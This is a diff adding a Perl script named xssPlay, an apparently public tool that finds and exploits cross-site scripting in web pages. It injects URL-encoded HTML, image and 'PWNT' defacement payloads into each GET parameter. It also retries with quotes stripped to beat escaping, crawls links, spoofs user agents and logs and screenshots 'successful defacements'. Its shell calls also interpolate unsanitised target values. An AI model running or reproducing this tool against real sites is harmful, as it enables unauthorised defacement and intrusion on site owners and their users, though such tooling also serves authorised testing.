@@ -1,0 +1,344 @@
+#!/usr/bin/perl
+# revision: 2.01
+# Use "-w" for debugging output, but for now the
+# 	WWW::Mechanize::Firefox modules makes
+#	Perl complain.
+#
+# xssPlay - Regular Expression Powered XSS Vuln Finding
+# coded by Douglas - WeakNetLabs@Gmail.com
+# 
+# Please see PDF: "aCross the Internet Oceans"
+#   at WeakNetLabs.com for more info.
+#
+# For screenshots, X needs to be running
+#   dependencies include a few Perl modules and Firefox plugin MozRepl
+#
+# Depends:
+use LWP; # HTTP Requests
+use LWP::UserAgent; # Spoofing UA's like Win2k
+use Term::ANSIColor; # Color output
+# use Imager::Screenshot 'screenshot'; # automatic screenshots!
+use WWW::Mechanize::Firefox; # to replace the killall/firefox-bin/screenshot method.
+
+name();
+my $suc = 0; # successful attempts
+my @emlinks; # Embedded links found for crawling
+my $to = 0; # Timeout for slow connections.
+my $crawl = 0; # should we crawl all GET links found in the DOM?
+my $search = 0; # search bar to attack? (use mode to attack AFTER attacking each current GET)
+my $css = 0; # using simple css? default false
+my $mqic = 0; # Escaped / Magic Quotes check default false
+my @date; # Date for date() subroutine below
+my $timestamp = ''; # for date() sub and logging
+my $dom = ''; # domain name for logging - All logs will be in newly created directory for each domain upon positive vulnerability check
+my $af = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0 )'; # default User Agent
+my $a; # user agent specified by hacker.
+my $img = 'http://localhost/vuln/xssplay.png'; # specified image url for defacement - default none.
+my $url = ''; # the URL specified - default is none; (required)
+my $tt = ''; # url with #ATTACK# in it to display without breaking the term buff
+my $tu = '';
+my $s = 0; # screenshots? defaulted to false;
+# Below is the encoded string for localhost/vuln/xssplay.png for image defacement
+my $def = '%3C%64%69%76%20%73%74%79%6C%65%3D%22%70%6F%73%69%74%69%6F%6E%3A%61%62%73%6F%6C%75%74%65%3B%74%6F%70%3A%30%70%78%3B%22%3E%3C%69%6D%67%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%6C%6F%63%61%6C%68%6F%73%74%2F%76%75%6C%6E%2F%78%73%73%70%6C%61%79%2E%70%6E%67%22%2F%3E%3C%2F%64%69%76%3E';
+my $logtype = 'txt'; # output log type, txt by default.
+
+if($ARGV[0]){getA();}else{error();}
+# Start sub routines:
+sub getA{ # go through arguments and get stuff:
+	for($i=0;$i<$#ARGV;$i++){
+		chomp($ARGV[$i]);
+		if($ARGV[$i] eq '-u'){
+			$url = $ARGV[$i+1];
+		}elsif($ARGV[$i] eq '-s'){
+			$s = 1;
+		}elsif($ARGV[$i] eq '-i'){
+			$img = $ARGV[$i+1];
+		}elsif($ARGV[$i] eq '-a'){
+			$a = $ARGV[$i+1];
+			if($a eq 'm' or $a eq 's' or $a eq 'x'){ ua($a); }
+		}elsif($ARGV[$i] eq '-t'){
+			$to = $ARGV[$i+1];
+		}elsif($ARGV[$i] eq '-o'){
+			$logtype = $ARGV[$i+1];
+		}
+	}
+	if($s){print " [ * ] Screenshots enabled\n";}
+	if($css){
+		# Below is the HTTP encoded string to make a simple CSS defacement:
+		$def = '%3C%64%69%76%20%73%74%79%6C%65%3D%22%62%6F%72%64%65%72%3A%74%68%69%6E%20%73%6F%6C%69%64%20%23%43%43%43%3B%70%6F%73%69%74%69%6F%6E%3A%61%62%73%6F%6C%75%74%65%3B%74%6F%70%3A%30%70%78%3B%63%6F%6C%6F%72%3A%72%65%64%3B%62%61%63%6B%67%72%6F%75%6E%64%2D%63%6F%6C%6F%72%3A%23%30%30%30%3B%20%70%61%64%64%69%6E%67%2D%6C%65%66%74%3A%31%30%70%78%3B%70%61%64%64%69%6E%67%2D%72%69%67%68%74%3A%31%30%70%78%3B%22%3E%3C%68%31%3E%50%57%4E%54%3C%2F%68%31%3E%3C%2F%64%69%76%3E';
+	}
+	# Get 1 part args: (this is actually better this way):
+	if(grep(/-r/,@ARGV)){
+		$crawl = 1;
+		print " [ * ] Recursive crawl: ON\n";
+	}
+	if(grep(/-c/,@ARGV)){
+		$css = 1;
+	}
+	getP();
+}
+sub crawl {
+	my $mech = WWW::Mechanize::Firefox->new();
+	$mech->get($url);
+	for ($mech->links()) { 
+		if(grep(/$_->url/,@emlinks)){
+		}else{
+			if($_->url =~ m/$dom.*\?[a-z]+/i){
+				push (@emlinks,$_->url);
+			}
+		}
+	}
+}
+sub getP{ # Get parameters in given URL
+	$urle = $url;
+	$urle =~ s/http:\/\/(localhost\/|[a-z0-9_.-]+\.[a-z]{2,4}\/.*\?|[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\/.*\?)//i;
+		# regular expressions above as follows: 'http://localhost/', 'http://anything.anything/anything.anything?'
+		#	'http://XXX.XXX.XXX.XXX/anything.anything?' this should suffice
+	if($urle =~ m/http:\/\/.*/){ print "  Error:\n\n  Please specify a filename to attack e.g. http://url/index.php or http://url/index.aspx\n  in your -u argument.\n\n"; exit;}
+	@params=split('&',$urle);
+	$dom = $url; # get domain for logging / screenshots
+	$dom =~ s/http:\/\///;
+	$dom =~ s/\/.*//;
+	testP();
+}
+sub name{
+	colorTxt("bold yellow","\n  xssPlay");
+	print " - XSS Vulnerability Finder Tool.\n";
+	print "  coded by Douglas WeakNetLabs\@Gmail.com\n\n";
+}
+sub error{ # something went wrong
+	usage();
+	exit;
+}
+sub usage{ # how to use this Application:
+	if($_[0]){
+		print "\n [ X ] ";
+		colorTxt("bold red",$_[0]);
+		print "\n\n";
+	}else{
+		print "  Usage: ./xssPlay -u <URL> <OPTIONS>\n"
+			. "\n  Options:\n\t"
+			. "-s (for screenshots)\n\t"
+			. "-i <IMG URL> (specify image URL to deface with)\n\t"
+			. "-c (Use only CSS/HTML for defacement)\n\t"
+			. "-r (Recursive crawling through embedded links)\n\t"
+			. "-o <TYPE> (where type is log type: html,txt)\n\t"
+			. "-a <USER AGENT> (in quotes)\n\t"
+			. "\n  Specify ANY arguments in single quotes, or your shell may not like them!\n"
+			. "\n  Legal Disclaimer: Author is not responsible for misuse or abuse. It is illegal\n"
+			. "\tto test server security without the owner's consent.\n\n";
+	}
+}
+sub testP{ # pull apart URL and test each GET parameter found.
+	if(grep(/-i/,@ARGV)){ # WHICH kind of defacement shall we attempt?
+		print " [ * ] Using img " . $img . " for defacement\n";
+		print " [ * ] Calling stringEnc\n";
+		$def = `./stringEnc -u -s '<div style="position:absolute;top:0px;"><img src="$img"/>'`;
+		chomp $def;
+		#print $def . "\n";
+	}elsif(grep(/-c/,@ARGV)){
+		print " [ * ] Using simple CSS/HTML for defacement\n";
+	}else{
+		print " [ * ] Using localhost xssplay.png for defacement\n";
+	}
+	for($i=0;$i<=$#params;$i++){ # Loop through our list of GET parameters to attack each one.
+		$tu = $url;
+		$tp = $params[$i];
+		$tp =~ s/(=).*/$1/;
+		$tt = $tu;
+		$tt =~ s/$params[$i]/$tp<%INJECT HERE%>/;
+		$tu =~ s/$params[$i]/$tp$def/;
+		colorTxt("bold white","\n  **** Testing URL: ");
+		print $tt . "\n";
+		get($tu);
+	} # DONE Running ttack on each param, now let's try a search bar:
+	if($search == 1){ # called after all has be tried in GET params and searchbar found
+		# Search Bar exists, let's GET sum!
+	}
+}
+sub get{ # Make the actual HTTP request here:
+	$u = $_[0]; # make url var that we can actually change
+	if($a eq 'x'){
+		ua($a);
+	}
+	my $ua = LWP::UserAgent->new;
+	$ua->agent($af);
+	my $req = HTTP::Request->new(GET => $u);
+	my $res = $ua->request($req);
+	if($res->is_success) { 
+		if($css == 1){
+			if($res->content =~ m/style=\\"/i){
+				escap();
+			}elsif($res->content =~ m/<h1>PWNT/i){
+				print "   [ ";
+				colorTxt("bold green","!");
+				print " ] $tt ";
+				colorTxt("bold green","is a success!\n");
+				success();
+			}elsif($res->content =~ m/(&lt;h1>PWNT|<h1&gt;PWNT|&lt;h1&gt;PWNT)/i){
+				print "    ";
+				colorTxt("bold red","X");
+				print "  Parameter secured with sanitation, ";
+				colorTxt("bold red","may not be vulnerable\n");
+			}else{
+				# thair shoul be no else!
+			}
+		}else{
+			if($res->content =~ m/&lt;img src="$img"\/>/i || $res->content =~ m/$img"\/&gt;/i){
+				print "    ";
+				colorTxt("bold red","X");
+				print "  Parameter secured with sanitation, ";
+				colorTxt("bold red","may not be vulnerable.\n");
+			}if($res->content =~ m/\\("|')$img\\("|')/i){ # Escaped Quotes:
+				escap();
+			}
+			if($res->content =~ m/<img src=("|')?$img("|')?(\/| )?>/i){
+			#if($res->content =~ m/<img src="$img"\/>/i){
+				print "    ";
+				colorTxt("bold green","!");
+				print "  $tt ";
+				colorTxt('bold green',"is a success!\n");
+				# print $res->content;
+				success();
+			}else{
+			}
+		}
+	}else{
+		print " [ X ] Your URL or host seems down!\n";
+		exit();
+	}
+}
+sub escap{
+	print "    ";
+	colorTxt("bold red","X");
+	print "  ";colorTxt('bold red','Magic or escaped quotes detected');print ", server may still be vulnerable!\n";
+	$mqic = 1;
+	if($css==0){
+		$u =~ s/%22//g; 
+		$u =~ s/%2F%3E/%20%3E/g; 
+	}else{
+		$u =~ s/%20%73%74%79%6C%65%3D%22%62%6F%72%64%65%72%3A%74%68%69%6E%20%73%6F%6C%69%64%20%23%43%43%43%3B%70%6F%73%69%74%69%6F%6E%3A%61%62%73%6F%6C%75%74%65%3B%74%6F%70%3A%30%70%78%3B%63%6F%6C%6F%72%3A%72%65%64%3B%62%61%63%6B%67%72%6F%75%6E%64%2D%63%6F%6C%6F%72%3A%23%30%30%30%3B%20%70%61%64%64%69%6E%67%2D%6C%65%66%74%3A%31%30%70%78%3B%70%61%64%64%69%6E%67%2D%72%69%67%68%74%3A%31%30%70%78%3B%22//;
+	}
+	get($u); # call it again to try again
+}
+sub success{
+	$suc++;
+	system("mkdir $dom 2>/dev/null"); # make directory to write log / screenshots to.
+	# Lets make an html log:
+	date();
+	if($logtype == 'html'){
+		html();
+	}
+	open(LOG,">>$dom/output.log"); # www.domain.com/output.log <-- sexy liek SQLMap ;)
+	my $urlt = $u;
+	$urlt =~ s/$def/<%INJECT HERE%>/g;
+	if($mqic==1){
+		print LOG "[".$timestamp."] URL MAGIC QUOTES DEFEATED: ".$u."\n";
+	}else{
+		print LOG "[".$timestamp."] URL RETURN VULNERABLE: ".$urlt."\n";
+	}
+	close(LOG); # write file and close for now.
+	if($s){screeny($u);}
+}
+sub html{
+	system("touch $dom/output.html");
+	my @lines = `grep 'beef' $dom/output.html | sort -u`;
+	system("cat res/htmlhead.txt | sed 's|<%DOMAIN%>|<a href=\"http://$dom\">$dom</a>|' > $dom/output.html"); # overwrite the file:
+	open(HTML,">>$dom/output.html") || die;
+	foreach(@lines){ # lets write with perl since "echo" is sloppy.
+		print HTML $_; # put in our found lines with vulns
+	}
+	my $u2 = $u;
+	chomp $u2;
+	my $html = '<div class="beef"><tr><td>' . $timestamp . '</td><td style="color:red;">TARGET VULNERABLE</td><td><a href="' . $u2;
+	$html .= '">' . $u2;
+	$html .= '</a></td></tr>'; # TODO Pull out each link and put it into an array, then sort? Perl's grep will not work on these, cos you cannot ignore regexps. ?
+	print HTML $html; # add the NEW line if its NOT THERE
+	system("cat res/htmlend.txt >> $dom/output.html"); # end our html
+	close HTML;
+}
+sub screeny{
+	print "    ";
+	colorTxt("bold green",">");
+	print"  Mechanizing screenshot\n";
+	my $mech = WWW::Mechanize::Firefox->new();
+	$mech->get($_[0]);
+	my $png = $mech->content_as_png();
+	date();
+	open(PNG,">$dom/screenshot_$timestamp.png");
+	print PNG $png;
+	close PNG;
+}
+sub date{
+	# This is needed because each vuln will be found at different times
+	# and obviously we wan less LoC
+	sleep 1; # too fast will overwrite a png file! :D
+	@date = localtime;
+	$timestamp = $date[2].":".$date[1].":".$date[0]." ".$date[3].".".$date[4].".".($date[5]+1900);
+}
+sub colorTxt{ # code to make text nice
+	print color $_[0];
+	print $_[1];
+	print color 'reset';
+}
+sub ua{ # randomly select user agent
+	my $uat; # user agent type
+	my $uad; # description of ua for informational purposes
+	if($_[0] eq 'm'){
+		$uat = '# MOBILE'; $uad = 'Mobile';
+	}elsif($_[0] eq 's'){
+		$uat = '# Standard'; $uad = 'PC';
+	}elsif($_[0] eq 'x'){
+		$uat = '# EOF'; $uad = 'Any';
+	}else{
+		# thair shoul be no else!
+	}
+	print " [ * ] Randomly choosing "; colorTxt('bold white',$uad); print " user agent\n";
+	my $m = 0;
+	my @lines; # array to put only targeted ua's into.
+	open(UAF,'../includes/user_agent_list.txt') or die("[ X ] Could not open UA list from pWeb Suite\n");
+	while (<UAF>){ # run through each line to make a temp list only of what we want.
+		my $l = $_;
+		chomp $l;
+		if ($l =~ m/^$uat/ || $_[0] eq 'x'){ # if you chose 'x', use any from the file.
+			$m = 1;	 # turn on the catcher
+		}
+		elsif($l =~ m/^# [A-Z]+/ && $m == 1){ # tun off the catcher
+			$m = 0; # 'x' will equal 'EOF' so all will be slurped
+		}
+		if($m == 1 && $l =~ m/[a-z]/i && $l !~ m/$uat/i){ # we only want lines with UA's and not the marker!
+			push(@lines,$l); # catch the lines!
+		}
+	}
+	my $r = int(rand($#lines));
+	# now set it:
+	$af = $lines[$r];
+	print " [ * ] Using user agent: "; colorTxt('bold white',$af); print "\n";
+}
+# DONE. LETS CRAWL?
+if($crawl > 0){
+	crawl(); # This creates the embedded links array
+	print "\n [ * ] "; colorTxt('bold white',"Starting recursive crawling mode.\n");
+	my $ml = 0; # my link count
+	foreach(@emlinks){ 
+		$ml++;
+		colorTxt('bold green',"  **** ");
+		colorTxt('bold green',"Link Found (" . $ml . "): ");print $_ . " \n";
+		$url = $_;
+		getP(); # this passes each link back through the tester.
+	}
+}else{
+	end();
+}
+end();
+sub end{
+	if($suc > 0){
+		print "\n [ * ] " . $dom . " successful defacements: ("; 
+		colorTxt('bold green', $suc);
+		print ")\n\n";;
+	}else{
+		print "\n [ "; 
+		colorTxt('bold red',"X");
+		print " ] Attack on " . $dom . " was unsuccessful \n\n";
+	}
+}
